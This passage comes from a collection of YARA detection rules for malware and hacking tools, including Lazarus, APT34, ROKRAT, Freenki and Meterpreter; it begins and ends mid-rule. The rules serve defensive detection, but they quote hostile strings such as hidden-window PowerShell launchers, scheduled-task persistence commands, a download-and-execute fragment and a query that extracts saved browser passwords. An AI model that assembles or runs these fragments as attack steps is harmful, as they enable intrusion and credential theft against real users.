      $s2 = "\"cpu-affinity\": null,   // set process affinity to CPU core(s), mask \"0x3\" for cores 0 and 1" fullword ascii
      $s5 = "\"nicehash\": false                  // enable nicehash/xmrig-proxy support" fullword ascii
      $s8 = "\"algo\": \"cryptonight\",  // cryptonight (default) or cryptonight-lite" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x0a7b or uint16 ( 0 ) == 0x0d7b ) and filesize < 5KB and 1 of them
} 

rule VBS_dropper_script_Dec17_1_RID30AE : DEMO SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects a supicious VBS script that drops an executable"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-01-01 12:50:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "TVpTAQEAAAAEAA" 
      $s2 = "TVoAAAAAAAAAAA" 
      $s3 = "TVqAAAEAAAAEAB" 
      $s4 = "TVpQAAIAAAAEAA" 
      $s5 = "TVqQAAMAAAAEAA" 
      $a1 = "= CreateObject(\"Wscript.Shell\")" fullword ascii
   condition: 
      filesize < 600KB and $a1 and 1 of ( $s* )
} 

rule RemCom_RemoteCommandExecution_RID3292 : DEMO HKTL T1077 T1136 {
   meta:
      description = "Detects strings from RemCom tool"
      author = "Florian Roth"
      reference = "https://goo.gl/tezXZt"
      date = "2017-12-28 14:10:51"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1077, T1136"
      minimum_yara = "1.7"
      
   strings:
      $ = "\\\\.\\pipe\\%s%s%d" 
      $ = "%s\\pipe\\%s%s%d%s" 
      $ = "\\ADMIN$\\System32\\%s%s" 
   condition: 
      1 of them
} 

rule PowerShell_Suite_Hacktools_Gen_Strings_RID3648 : DEMO GEN SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects strings from scripts in the PowerShell-Suite repo"
      author = "Florian Roth"
      reference = "https://github.com/FuzzySecurity/PowerShell-Suite"
      date = "2017-12-27 16:49:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, GEN, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $ = "[!] NtCreateThreadEx failed.." fullword ascii
      $ = "[?] Executing mmc.." ascii
      $ = "[!] This method is only supported on 64-bit!" fullword ascii
      $ = "$LNK = [ShellLink.Shortcut]::FromByteArray($LNKHeader.GetBytes())" fullword ascii
      $ = "$CallResult = [UACTokenMagic]::TerminateProcess($ShellExecuteInfo.hProcess, 1)" fullword ascii
      $ = "[!] Unable to open process (as Administrator), this may require SYSTEM access." fullword ascii
      $ = "[!] Error, NTSTATUS Value: " ascii
      $ = "[!] UAC artifact: " ascii
      $ = "[>] Process dump success!" ascii
      $ = "[!] Process dump failed!" ascii
      $ = "[+] Eidolon entry point:" fullword ascii
      $ = "Wait for shellcode to run" fullword ascii
      $ = "$Command = Read-Host \"`nSMB shell\"" fullword ascii
      $ = "Use Netapi32::NetSessionEnum to enumerate active sessions on domain joined machines." fullword ascii
      $ = "Invoke-CreateProcess -Binary C:\\Windows\\System32\\" ascii
      $ = "[?] Thread belongs to: " ascii
      $ = "[?] Operating system core count: " ascii
      $ = "[>] Calling Advapi32::LookupPrivilegeValue --> SeDebugPrivilege" fullword ascii
      $ = "Calling Advapi32::OpenProcessToken --> LSASS" ascii
      $ = "[!] Mmm, something went wrong! GetLastError returned:" ascii
      $ = "if (($FileBytes[0..1] | % {[Char]$_}) -join '' -cne 'MZ')" fullword ascii
   condition: 
      filesize < 100KB and 1 of them
} 

rule PowerShell_Suite_Eidolon_RID30A8 : DEMO FILE SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects PowerShell Suite Eidolon script - file Start-Eidolon.ps1"
      author = "Florian Roth"
      reference = "https://github.com/FuzzySecurity/PowerShell-Suite"
      date = "2017-12-27 12:49:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $ = "[+] Eidolon entry point:" ascii
      $ = "C:\\PS> Start-Eidolon -Target C:\\Some\\File.Path -Mimikatz -Verbose" fullword ascii
      $ = "[Int16]$PEArch = '0x{0}' -f ((($PayloadBytes[($OptOffset+1)..($OptOffset)]) | % {$_.ToString('X2')}) -join '')" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x7566 and filesize < 13000KB and 1 of them
} 

rule HiddenCobra_BANKSHOT_Gen_RID2F76 : DEMO EXE FILE G0032 GEN MAL NK T1136 {
   meta:
      description = "Detects Hidden Cobra BANKSHOT trojan"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/HIDDEN-COBRA-North-Korean-Malicious-Cyber-Activity"
      date = "2017-12-26 11:58:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0032, GEN, MAL, NK, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Mozilla/4.0 (compatible; MSIE 8.0; Win32)" fullword wide
      $s2 = "rHTTP/1.1 200 Connection established" fullword wide
      $s3 = "Proxy-Connection: keep-alive" fullword wide
      $s4 = "\\msncf.dat" fullword wide
      $s5 = "msvcru32.bat" fullword ascii
      $s6 = "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"%s\" /f" fullword ascii
      $s7 = "MXINFO.DLL" fullword ascii
      $s8 = "usrvc32.bat" fullword ascii
      $s9 = "ping -n 1 127.0.0.1" fullword ascii
      $s10 = "%sd.e%sc \"%s > %s 2>&1\"" ascii fullword
      $s11 = "DWS*.tmp" ascii fullword
      $s12 = "CS*.tmp" fullword wide
      $s13 = "WM*.tmp" fullword wide
      $x1 = "CgpaipIddwspwe32Hnaehsdi" fullword ascii
      $x2 = "RpiPmtiCdopIsgpao" fullword ascii
      $x3 = "RpiLtnodlhOtgpcidgyA" fullword ascii
      $x4 = "LatiQdgHtnrwpDbupci" fullword ascii
      $x5 = "vchost.exe" fullword ascii
      $x6 = "\\system32\\msncf.dat" fullword ascii
      $x7 = "GprthipgHpgktcpCigwSanowpgA" fullword ascii
      $a1 = "live.dropbox.com" fullword ascii
      $a2 = "tatadocomo.yahoo.com" fullword ascii
      $a3 = "widgets.twimg.com" fullword ascii
      $a4 = "history.paypal.com" fullword ascii
      $a5 = "www.bitcoin.org" fullword ascii
      $a6 = "web.whatsapp.com" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( 1 of ( $x* ) or 2 of ( $s* ) or 4 of ( $a* ) )
} 

rule Armitage_msfconsole_RID2ED3 : DEMO FILE HKTL T1136 {
   meta:
      description = "Detects Armitage component"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-12-24 11:31:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\umeterpreter\\u >" fullword ascii
      $s3 = "^meterpreter >" fullword ascii
      $s11 = "\\umsf\\u>" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x6d5e and filesize < 1KB and ( 8 of them ) ) or ( all of them )
} 

rule Armitage_MeterpreterSession_Strings_RID3556 : DEMO HKTL T1136 {
   meta:
      description = "Detects Armitage component"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-12-24 16:08:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "session.meterpreter_read" fullword ascii
      $s2 = "sniffer_dump" fullword ascii
      $s3 = "keyscan_dump" fullword ascii
      $s4 = "MeterpreterSession.java" fullword ascii
   condition: 
      filesize < 30KB and 1 of them
} 

rule Armitage_OSX_RID2B94 : DEMO HKTL MACOS T1136 {
   meta:
      description = "Detects Armitage component"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-12-24 09:12:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, MACOS, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "resources/covertvpn-injector.exe" fullword ascii
      $s10 = "resources/browserpivot.x64.dll" fullword ascii
      $s17 = "resources/msfrpcd_new.bat" fullword ascii
   condition: 
      filesize < 6000KB and 1 of them
} 

rule Lazarus_Dec_17_4_RID2CB8 : APT DEMO G0032 NK T1136 {
   meta:
      description = "Detects Lazarus malware from incident in Dec 2017ithumb.js"
      author = "Florian Roth"
      reference = "https://goo.gl/8U6fY2"
      date = "2017-12-20 10:01:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0032, NK, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "var _0xf5ed=[\"\\x57\\x53\\x63\\x72\\x69\\x70\\x74\\x2E\\x53\\x68\\x65\\x6C\\x6C\"," ascii
   condition: 
      filesize < 9KB and 1 of them
} 

rule Lazarus_Dec_17_1_RID2CB5 : APT DEMO FILE G0032 NK T1136 T1223 {
   meta:
      description = "Detects Lazarus malware from incident in Dec 2017"
      author = "Florian Roth"
      reference = "https://goo.gl/8U6fY2"
      date = "2017-12-20 10:00:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0032, NK, T1136, T1223"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "::DataSpace/Storage/MSCompressed/Transform/" ascii
      $s2 = "HHA Version 4." ascii
      $s3 = { 74 45 58 74 53 6F 66 74 77 61 72 65 00 41 64 6F
              62 65 20 49 6D 61 67 65 52 65 61 64 79 71 } 
      $s4 = "bUEeYE" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5449 and filesize < 4000KB and all of them
} 

rule Lazarus_Dec_17_2_RID2CB6 : APT DEMO EXE FILE G0032 NK T1136 {
   meta:
      description = "Detects Lazarus malware from incident in Dec 2017"
      author = "Florian Roth"
      reference = "https://goo.gl/8U6fY2"
      date = "2017-12-20 10:00:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0032, NK, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "SkypeSetup.exe" fullword wide
      $s2 = "%s\\SkypeSetup.exe" fullword ascii
      $s3 = "Skype Technologies S.A." fullword wide
      $a1 = "Microsoft Code Signing PCA" ascii wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 7000KB and ( all of ( $s* ) and not $a1 )
} 

rule Lazarus_Dec_17_5_RID2CB9 : APT DEMO G0032 NK T1033 T1053 T1136 {
   meta:
      description = "Detects Lazarus malware from incident in Dec 2017"
      author = "Florian Roth"
      reference = "https://goo.gl/8U6fY2"
      date = "2017-12-20 10:01:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0032, NK, T1033, T1053, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "$ProID = Start-Process powershell.exe -PassThru -WindowStyle Hidden -ArgumentList" fullword ascii
      $x2 = "$respTxt = HttpRequestFunc_doprocess -szURI $szFullURL -szMethod $szMethod -contentData $contentData;" fullword ascii
      $x3 = "[String]$PS_PATH = \"C:\\\\Users\\\\Public\\\\Documents\\\\ProxyAutoUpdate.ps1\";" fullword ascii
      $x4 = "$cmdSchedule = 'schtasks /create /tn \"ProxyServerUpdater\"" ascii
      $x5 = "/tr \"powershell.exe -ep bypass -windowstyle hidden -file " ascii
      $x6 = "C:\\\\Users\\\\Public\\\\Documents\\\\tmp' + -join " ascii
      $x7 = "$cmdResult = cmd.exe /c $cmdInst | Out-String;" fullword ascii
      $x8 = "whoami /groups | findstr /c:\"S-1-5-32-544\"" fullword ascii
   condition: 
      filesize < 500KB and 1 of them
} 

rule Invoke_PSImage_RID2C62 : DEMO SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects a command to execute PowerShell from String"
      author = "Florian Roth"
      reference = "https://github.com/peewpw/Invoke-PSImage"
      date = "2017-12-16 09:46:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $ = "IEX([System.Text.Encoding]::ASCII.GetString(" ascii wide
      $ = "System.Drawing.Bitmap((a Net.WebClient).OpenRead(" ascii wide
      $ = { 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52
            00 00 04 E4 00 00 03 A0 08 06 00 00 00 9D AF A9
            E8 00 00 00 09 70 48 59 73 00 00 19 D6 00 00 19
            D6 01 18 D1 CA ED 00 00 00 07 74 49 4D 45 07 E1
            0C 0F 13 1E 36 89 C4 28 BF 00 00 00 07 74 45 58
            74 41 75 74 68 6F 72 00 A9 AE CC 48 00 00 00 0C
            74 45 58 74 44 65 73 63 72 69 70 74 69 6F 6E 00
            13 09 21 23 00 00 00 0A 74 45 58 74 43 6F 70 79
            72 69 67 68 74 00 AC 0F CC 3A 00 00 00 0E 74 45
            58 74 43 72 65 61 74 69 6F 6E 20 74 69 6D 65 00
            35 F7 0F } 
   condition: 
      filesize < 3000KB and 1 of them
} 

rule Triton_trilog_RID2C81 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects Triton APT malware - file trilog.exe"
      author = "Florian Roth"
      reference = "https://goo.gl/vtQoCQ"
      date = "2017-12-14 09:52:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "inject.bin" ascii
      $s2 = "PYTHON27.DLL" fullword ascii
      $s3 = "payload" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them
} 

rule Suspicious_AutoIt_by_Microsoft_RID334C : DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Detects a AutoIt script with Microsoft identification"
      author = "Florian Roth"
      reference = "Internal Research - VT"
      date = "2017-12-14 14:41:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      nodeepdive = "1"
      tags = "DEMO, EXE, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Microsoft Corporation. All rights reserved" fullword wide
      $s2 = "AutoIt" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them
} 

rule ZXshell_20171211_chrsben_RID2F0D : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects ZxShell variant surfaced in Dec 17"
      author = "Florian Roth"
      reference = "https://goo.gl/snc85M"
      date = "2017-12-11 11:40:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "ncProxyXll" fullword ascii
      $s1 = "Uniscribe.dll" fullword ascii
      $s2 = "GetModuleFileNameDll" fullword ascii
      $s4 = "$Hangzhou Shunwang Technology Co.,Ltd0" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( pe.imphash ( ) == "de481441d675e9aca4f20bd8e16a5faa" or pe.exports ( "PerfectWorld" ) or pe.exports ( "ncProxyXll" ) or 1 of ( $x* ) or 2 of them )
} 

rule xRAT_1_RID2900 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects Patchwork malware"
      author = "Florian Roth"
      reference = "https://goo.gl/Pg3P4W"
      date = "2017-12-11 19:45:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\" -CHECK & PING -n 2 127.0.0.1 & EXIT" fullword wide
      $x2 = "xClient.Core.Elevation" fullword ascii
      $x3 = ">> Welcome to MAX-Shell :Session created" fullword wide
      $x4 = "xClient.Properties.Resources.resources" fullword ascii
      $x5 = "<description>My UAC Compatible application</description>" fullword ascii
      $s1 = "ping -n 20 localhost > nul" fullword wide
      $s2 = "DownloadAndExecute" fullword ascii
      $s3 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36" fullword wide
      $s4 = "Client.exe" fullword ascii
      $s5 = "Microsoft -Defender" fullword wide
      $s6 = "Microsoft- Defender" fullword wide
      $s7 = "set_RunHidden" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 3 of them )
} 

rule ReconCommands_in_File_RID2F4F : DEMO SUSP T1007 T1033 T1057 T1082 T1136 {
   meta:
      description = "Detects various recon commands in a single file"
      author = "Florian Roth"
      reference = "https://twitter.com/haroonmeer/status/939099379834658817"
      date = "2017-12-11 11:51:41"
      score = 40
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      type = "file"
      tags = "DEMO, SUSP, T1007, T1033, T1057, T1082, T1136"
      minimum_yara = "1.7"
      
   strings:
      $ = "tasklist" 
      $ = "net time" 
      $ = "systeminfo" 
      $ = "whoami" 
      $ = "nbtstat" 
      $ = "net start" 
      $ = "qprocess" 
      $ = "nslookup" 
   condition: 
      filesize < 5KB and 4 of them
} 

rule APT34_Malware_HTA_RID2CC1 : DEMO G0049 G0057 MAL MIDDLE_EAST T1136 {
   meta:
      description = "Detects APT 34 malware"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html"
      date = "2017-12-07 10:02:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, G0049, G0057, MAL, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "WshShell.run \"cmd.exe /C C:\\ProgramData\\" ascii
      $x2 = ".bat&ping 127.0.0.1 -n 6 > nul&wscript  /b" ascii
      $x3 = "cmd.exe /C certutil -f  -decode C:\\ProgramData\\" ascii
      $x4 = "a.WriteLine(\"set Shell0 = CreateObject(" ascii
      $x5 = "& vbCrLf & \"Shell0.run" ascii
      $s1 = "<title>Blog.tkacprow.pl: HTA Hello World!</title>" fullword ascii
      $s2 = "<body onload=\"test()\">" fullword ascii
   condition: 
      filesize < 60KB and ( 1 of ( $x* ) or all of ( $s* ) )
} 

rule APT34_Malware_Exeruner_RID2F32 : DEMO EXE FILE G0049 G0057 MAL MIDDLE_EAST T1053 T1136 {
   meta:
      description = "Detects APT 34 malware"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html"
      date = "2017-12-07 11:46:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0049, G0057, MAL, MIDDLE_EAST, T1053, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\obj\\Debug\\exeruner.pdb" ascii
      $x2 = "\"wscript.shell`\")`nShell0.run" wide
      $x3 = "powershell.exe -exec bypass -enc \" + ${global:$http_ag} +" wide
      $x4 = "/c powershell -exec bypass -window hidden -nologo -command " fullword wide
      $x5 = "\\UpdateTasks\\JavaUpdatesTasksHosts\\" wide
      $x6 = "schtasks /create /F /ru SYSTEM /sc minute /mo 1 /tn" wide
      $x7 = "UpdateChecker.ps1 & ping 127.0.0.1" wide
      $s8 = "exeruner.exe" fullword wide
      $s9 = "${global:$address1} = $env:ProgramData + \"\\Windows\\Microsoft\\java\";" fullword wide
      $s10 = "C:\\ProgramData\\Windows\\Microsoft\\java" fullword wide
      $s11 = "function runByVBS" fullword wide
      $s12 = "$84e31856-683b-41c0-81dd-a02d8b795026" fullword ascii
      $s13 = "${global:$dns_ag} = \"aQBmACAAKAAoAEcAZQB0AC0AVwBtAGk" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them
} 

rule Universal_Exploit_Strings_RID3157 : DEMO SUSP T1136 {
   meta:
      description = "Detects a group of strings often used in exploit codes"
      author = "Florian Roth"
      reference = "not set"
      date = "2017-12-02 13:18:21"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Exploit" fullword ascii
      $s2 = "Payload" fullword ascii
      $s3 = "CVE-201" ascii
      $s4 = "bindshell" 
   condition: 
      ( filesize < 2KB and 3 of them )
} 

rule Suspicious_JS_script_content_RID3292 : DEMO SCRIPT T1064 T1117 T1136 {
   meta:
      description = "Detects suspicious statements in JavaScript files"
      author = "Florian Roth"
      reference = "Research on Leviathan https://goo.gl/MZ7dRg"
      date = "2017-12-02 14:10:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, T1064, T1117, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "new ActiveXObject('WScript.Shell')).Run('cmd /c " ascii
      $x2 = ".Run('regsvr32 /s /u /i:" ascii
      $x3 = "new ActiveXObject('WScript.Shell')).Run('regsvr32 /s" fullword ascii
      $x4 = "args='/s /u /i:" ascii
   condition: 
      ( filesize < 10KB and 1 of them )
} 

rule UBootRAT_RID29E1 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects UBoot RAT Samples"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/"
      date = "2017-11-29 02:00:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "URLDownloadToFileA" ascii
      $s2 = "GetModuleFileNameW" ascii
      $s4 = "WININET.dll" ascii
      $s5 = "urlmon.dll" ascii
      $s6 = "WTSAPI32.dll" ascii
      $s7 = "IPHLPAPI.DLL" ascii
      $op1 = { 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68
               69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F
               74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20
               6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00 } 
      $vprotect = { 2E 76 6D 70 30 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and uint32 ( uint32 ( 0x3c ) ) == 0x4550 and filesize < 1400KB and filesize > 800KB and ( all of ( $s* ) and $op1 at 64 and uint16 ( uint32 ( 0x3c ) + 11 ) == 0x59 and $vprotect in ( 600 .. 700 ) )
} 

rule UBootRAT_Dropper_RID2D1C : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects UBootRAT Dropper"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/"
      date = "2017-11-29 10:17:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "GetCurrenvackageId" fullword ascii
      $s2 = "fghijklmnopq" fullword ascii
      $s3 = "23456789:;<=>?@ABCDEFGHIJKLMNOPQ" fullword ascii
      $s4 = "PMM/dd/y" fullword ascii
      $s5 = "bad all" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule ROKRAT_Dropper_Nov17_RID2E19 : DEMO EXE FILE MAL {
   meta:
      description = "Detects dropper for ROKRAT malware"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html"
      date = "2017-11-28 11:00:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2500KB and pe.imphash ( ) == "c6187b1b5f4433318748457719dd6f39"
} 

rule Freeenki_Infostealer_Nov17_RID310F : DEMO EXE FILE MAL T1003 T1085 T1136 {
   meta:
      description = "Detects Freenki infostealer malware"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html"
      date = "2017-11-28 13:06:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1003, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "base64Encoded=\"TVqQAAMAAAAEAAAA" ascii
      $x2 = "command =outFile &\" sysupdate\"" fullword ascii
      $x3 = "outFile=sysDir&\"\\rundll32.exe\"" fullword ascii
      $s1 = "SOFTWARE\\Clients\\StartMenuInternet\\firefox.exe\\shell\\open\\command" fullword wide
      $s2 = "c:\\TEMP\\CrashReports\\" fullword ascii
      $s3 = "objShell.run command, 0, True" fullword ascii
      $s4 = "sysDir = shell.ExpandEnvironmentStrings(\"%windir%\")" fullword ascii
      $s5 = "'Wscript.echo \"Base64 encoded: \" + base64Encoded" fullword ascii
      $s6 = "set shell = WScript.CreateObject(\"WScript.Shell\")" fullword ascii
      $a1 = "\\Google\\Chrome\\User Data\\Default\\Login Data" fullword ascii
      $a2 = "SELECT username_value, password_value, signon_realm FROM logins" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 1 of ( $x* ) or 3 of them or all of ( $a* ) )
} 

rule Freeenki_Infostealer_Nov17_Export_Sig_Testing_RID38AF : DEMO EXE FILE MAL {
   meta:
      description = "Detects Freenki infostealer malware"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html"
      date = "2017-11-28 18:31:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      required_modules = "pe"
      minimum_yara = "3.6.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and pe.exports ( "getUpdate" ) and pe.number_of_exports == 1
} 

rule ROKRAT_Nov17_1_RID2B6E : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects ROKRAT malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-11-28 09:06:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\T+M\\Result\\DocPrint.pdb" ascii
      $s2 = "d:\\HighSchool\\version 13\\2ndBD" ascii
      $s3 = "e:\\Happy\\Work\\Source\\version" ascii
      $x1 = "\\appdata\\local\\svchost.exe" ascii
      $x2 = "c:\\temp\\esoftscrap.jpg" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and 1 of them )
} 

rule Greenbug_Malware_Nov17_1_RID2FF2 : DEMO EXE FILE MAL MIDDLE_EAST T1136 {
   meta:
      description = "Detects Greenbug Malware"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/greenbug/"
      date = "2017-11-26 12:18:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, MIDDLE_EAST, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "AgentV2.exe  -c  SampleDomain.com" fullword ascii
      $x2 = ".ntpupdateserver.com" fullword ascii
      $x3 = "Content-Disposition: form-data; name=\"file\"; filename=\"a.a\"" fullword ascii
      $x4 = "a67d0db885a3432576548a2a03707334" fullword ascii
      $x5 = "a67d0db8a2a173347654432503702aa3" fullword ascii
      $x6 = "!!! can not create output file !!!" fullword ascii
      $s1 = "\\runlog*" fullword ascii
      $s2 = "can not specify username!!" fullword ascii
      $s3 = "Agent can not be configured" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( pe.imphash ( ) == "58ba44f7ff5436a603fec3df97d815ea" or pe.imphash ( ) == "538805ecd776b9a42e71aebf94fde1b1" or 1 of ( $x* ) or 3 of them )
} 

rule OilRig_Malware_Nov17_13_RID2F3C : DEMO EXE FILE G0049 MAL MIDDLE_EAST T1136 {
   meta:
      description = "Detects OilRig DNSCat malware"
      author = "Florian Roth"
      reference = "https://twitter.com/ClearskySec/status/933280188733018113"
      date = "2017-11-22 11:48:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0049, MAL, MIDDLE_EAST, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
